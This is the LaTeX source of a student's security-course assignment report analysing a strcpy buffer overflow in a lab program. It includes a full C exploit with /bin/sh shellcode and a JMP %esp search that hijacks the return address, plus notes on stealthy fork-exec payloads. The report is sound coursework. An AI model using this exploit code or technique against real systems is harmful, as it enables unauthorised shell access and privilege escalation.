\documentclass{article}

\usepackage{graphicx}
\usepackage{moreverb}

\author{Nic Hollingum - 308193415}
\title{ELEC 5616 - Project 3}

\addtolength{\oddsidemargin}{-.5in}
\addtolength{\evensidemargin}{-.5in}
\addtolength{\textwidth}{1.0in}
\addtolength{\topmargin}{-0.5in}
\addtolength{\textheight}{1.5in}

\begin{document}
\maketitle

\section*{A}
The code makes a call to the unsafe method {\em strcpy} without sanitising data.
This call is vulnerable to buffer overflow, which we shall explot.

Since the string is passed unchecked from the command line, this allows an attacker to inject code into the program and re-route execution to the injected code.
Such an attack is made possible because strcpy is an unprotected method and allows us to overwrite past the normal bounds of the buffer into the stack return address

\section*{B}

The following code was sourced from ``http://www.win.tue.nl/~aeb/linux/hh/newsletter13.txt'' on 2/6/2011.
It contains the shellcode and address finding routines to facilitate the exploit.
Thanks to IZIK for proof of concept.

This exploit was compiled with gcc 3.4 on atomic against a slightly modified version of commanche (without a versioin integer, for simplicity).
This code could be modified to run with the version integer by simply increasing the size of evilbuf, the actual size increase will depend on compiler version and flags.

This code uses an interesting property in order to locate and jump to the shellcode.
We make the guess that somewhere in memory there exists a collection of bits which map to the machine instruction ``jump to the instruction pointed to by the word at the location pointed to by the stack pointer''.
Or, ``JMP \%esp''.

As it happens there is a static shared object linux-gate.so.1 which is always at a known location in memory, and is likely to contain the required bit sequence.
Thus we look through memory around where we expect to find linux-gate.so.1, and when we find the right bits in memory we remember this.
We will use this location to overwrite the return address.
The machine will attempt to return from the function, read the return address and jump to a point in memory with the instruction ``JMP \%esp'', which will make it jump to the part of the stack where our shellcode sits.

\begin{verbatimtab}
/*
 * va-exploit-poc.c, Exploiting va-vuln-poc.c 
 * under VA patch (Proof of Concept!)
 * - izik@tty64.org
 * Appropriated for CNS assignment by Nic
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[] = 
	"\x6a\x0b"              // push $0xb 
	"\x58"                  // pop %eax 
	"\x99"                  // cltd 
	"\x52"                  // push %edx 
	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f 
	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f 
	"\x89\xe3"              // mov %esp,%ebx 
	"\x52"                  // push %edx 
	"\x53"                  // push %ebx 
	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80";             // int $0x80 

unsigned long find_esp(void) {
        int i;
        char *ptr = (char *) 0xffffe000;

	/* Search through memorry for a chunk of ram with the right bits */
	/* We look through this staticly linked shared object for the bits that say: */
	/* "jump to the stack pointer" */
        for (i = 0; i < 4095; i++) {

                if (ptr[i] == '\xff' && ptr[i+1] == '\xe4') {
			printf("* Found JMP %%ESP @ 0x%08x\n", ptr+i);
			return (unsigned long) ptr+i;
                }
        }

	return 0;
}

int main(int argc, char **argv) {

	char evilbuf[295];
	char *evilargs[] = { "./commanche", evilbuf , NULL };
	unsigned long retaddr;

	/* find the static memory address of the library we want to ping off */
	retaddr = find_esp();
	if (!retaddr) {
		printf("* No JMP %%ESP in this kernel!\n");
		return -1;
	}

	/* loading the weapon
	 * Fill the buffer with some random character (in this case A)
	 * put the return address 12 bytes beyong the end of the buffer
	 * put the code after the return address
	 */
	memset(evilbuf, 0x41, sizeof(evilbuf));
	memcpy(evilbuf+268, &retaddr, sizeof(long));
	memcpy(evilbuf+272, shellcode, sizeof(shellcode));

	execve("./commanche", evilargs, NULL);
	return 1;
}
\end{verbatimtab}

\section*{C}
The use of strncpy or memcpy (if the null termination is irrelevant) is preferable since both of these methods restrict the copy size to a known quantity.
In other words if the injection attack is attempted then the method call only copes some of the characters between buffers.
In the case of strncopy it will copy up to the termination character or n characters, whichever comes first.
Note that 
\begin{verbatimtab}
#include<stdio.h>
#include<string.h>

int
printURL(char *myURL) {
	int version = 2;
	char url[256];
	
	strncpy(url, myURL, 255);
	printf("Loading URL: %s\n", url);
	
	return 0;
}

void
main(int argc, char **argv) {
	printURL(argv[1]);
}
\end{verbatimtab}

\section*{D}
This problem specifically would not exist.
Java does bounds checking on arrays automatically, to prevent this kind of thing.
As it happens an equivalent java statement to strcpy is:
\begin{verbatim} String a = b; \end{verbatim}

However there are other security issues with java.
The JVM itself is a large program with many implementations, it can be an attack vector itself, despite the many security features of java's higher level language.

\section*{E}

This exploit injects instructions so as to gain a command shell.
However this is only one way of attacking.
Another approach is to simply overwrite the return address with a known memory location of malicious code.
That is, have some malicious code running (without privelages) and put the return address of the unprivelaged malicious code into the stack of the privelaged vulnerable code.
This means that the process executing with privelages is now suddenly executing attack code with elevated privelage.
This variation is more suitable for distribution on multiple architectures, since pre-knowledge of the architecture is not necessary.

Another thing is to simply change the content of the injected code.
In our exploit we spawn a shell, but another thing would be to exec malicious software, or even more subtly, fork exec malicious software.
The advantage of the fork exec is that the user may be completely unaware of the malicious software, as we can return the vulnerable program to normal execution.

\section*{F}

More important.

These kinds of problems allow possibly trusted systems to be subverted into malicious ones.
It is pointless to know exactly who a connection is coming from, since that person's system may have been compromised by some kind of buffer overflow.
Strong authentication would only prevent people from accepting connections from known malicious sources.
However so long as buffer overflows exist, any source can be controlled by a malicious attacker, and therefore authenticate strongly despite being malicious.

\end{document}
